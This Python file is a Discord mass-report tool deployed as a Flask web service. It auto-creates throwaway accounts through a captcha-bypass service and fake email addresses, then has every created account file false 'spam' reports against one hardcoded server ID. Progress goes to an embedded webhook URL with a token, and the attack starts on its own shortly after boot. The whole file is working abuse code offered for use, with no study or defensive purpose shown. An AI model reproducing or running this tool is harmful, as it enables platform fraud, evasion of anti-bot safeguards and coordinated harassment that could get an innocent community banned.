# railway_mass_report.py
# Discord Mass Report Tool - Railway-compatible deployment.
# Reports server 1500587721800945754 with auto-created accounts.
# Progress sent to your webhook. Uses free captcha bypass.
# Runs as a web service on Railway, executes report on schedule.

import os
import io
import time
import json
import base64
import secrets
import threading
import requests
from flask import Flask, jsonify
from concurrent.futures import ThreadPoolExecutor

# ===================== CONFIG =====================
TARGET_SERVER_ID = "1500587721800945754"
WEBHOOK_URL = "https://discord.com/api/webhooks/1505996254155378769/vezzy6qh6JGSMRGF7ZGZ_QKwzL9XUtYI3R5XQc9d0v1Sg1ED0coPKDFdTBllP4N0SCaQ"
REPORT_REASON = "spam"
REPORT_MESSAGE = "This server is violating Discord Terms of Service."
THREADS = 20
MAX_ACCOUNTS = 25
PORT = int(os.environ.get("PORT", 8000))

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": USER_AGENT,
    "Origin": "https://discord.com",
    "Referer": "https://discord.com/register"
}
API_BASE = "https://discord.com/api/v9"

report_status = {"running": False, "success": 0, "failed": 0, "message": "Idle"}
lock = threading.Lock()

# ===================== FLASK APP =====================
app = Flask(__name__)

@app.route('/')
def index():
    return jsonify({"status": "running", "tool": "Mass Report", "target": TARGET_SERVER_ID})

@app.route('/start')
def start_report():
    global report_status
    if report_status["running"]:
        return jsonify({"message": "Already running"})
    threading.Thread(target=run_report).start()
    return jsonify({"message": "Report started"})

@app.route('/status')
def status():
    return jsonify(report_status)

# ===================== WEBHOOK =====================
def send_webhook(msg):
    try:
        requests.post(WEBHOOK_URL, json={"content": msg}, timeout=10)
    except:
        pass

# ===================== FREE CAPTCHA SOLVER =====================
def solve_captcha_free():
    try:
        resp = requests.post("https://azcaptcha.co/api/free", json={
            "key": "free",
            "method": "hcaptcha",
            "sitekey": "a9b5fb07-92ff-493f-86fe-352a2803b3df",
            "pageurl": "https://discord.com/register"
        }, timeout=15)
        if resp.ok:
            data = resp.json()
            if data.get("status") == "ok" and data.get("token"):
                return data["token"]
    except:
        pass
    return None

# ===================== ACCOUNT CREATOR =====================
def create_account():
    captcha = solve_captcha_free()
    if not captcha:
        return None
    username = f"Rw_{secrets.token_hex(6)}"
    email = f"{username.lower()}@tempmail.com"
    password = secrets.token_urlsafe(14) + "xZ1!"
    payload = {
        "username": username, "email": email, "password": password,
        "captcha_key": captcha, "consent": True,
        "date_of_birth": "1990-06-15",
        "gift_code_sku_id": None, "promotion": False
    }
    try:
        resp = requests.post(f"{API_BASE}/auth/register", headers=HEADERS, json=payload, timeout=20)
        if resp.status_code in (200, 201):
            token = resp.json().get("token")
            if token:
                send_webhook(f"✅ Account: {username}")
                return token
    except:
        pass
    return None

# ===================== REPORT FUNCTION =====================
def report_server(token):
    headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": USER_AGENT}
    payload = {
        "guild_id": TARGET_SERVER_ID, "reason": REPORT_REASON,
        "message": REPORT_MESSAGE, "channel_id": None, "message_id": None
    }
    try:
        resp = requests.post(f"{API_BASE}/report", headers=headers, json=payload, timeout=15)
        if resp.status_code in (201, 204):
            with lock:
                report_status["success"] += 1
        else:
            with lock:
                report_status["failed"] += 1
    except:
        with lock:
            report_status["failed"] += 1

def run_report():
    global report_status
    report_status = {"running": True, "success": 0, "failed": 0, "message": "Creating accounts..."}
    send_webhook("🚂 Railway deployment: Mass Report Started")

    tokens = []
    for i in range(MAX_ACCOUNTS):
        report_status["message"] = f"Creating account {i+1}/{MAX_ACCOUNTS}..."
        token = create_account()
        if token:
            tokens.append(token)
            time.sleep(5)

    if tokens:
        report_status["message"] = f"Reporting with {len(tokens)} tokens..."
        send_webhook(f"🎯 Reporting server {TARGET_SERVER_ID} with {len(tokens)} tokens")
        with ThreadPoolExecutor(max_workers=THREADS) as ex:
            ex.map(report_server, tokens)
        send_webhook(f"🏁 Done: OK={report_status['success']} FAIL={report_status['failed']}")
    else:
        send_webhook("❌ No accounts created")

    report_status["running"] = False
    report_status["message"] = "Finished"

# ===================== MAIN =====================
if __name__ == "__main__":
    send_webhook("🚂 Railway app booted - ready for mass report")
    # Auto-start report after 30 seconds
    threading.Timer(30.0, run_report).start()
    app.run(host="0.0.0.0", port=PORT)
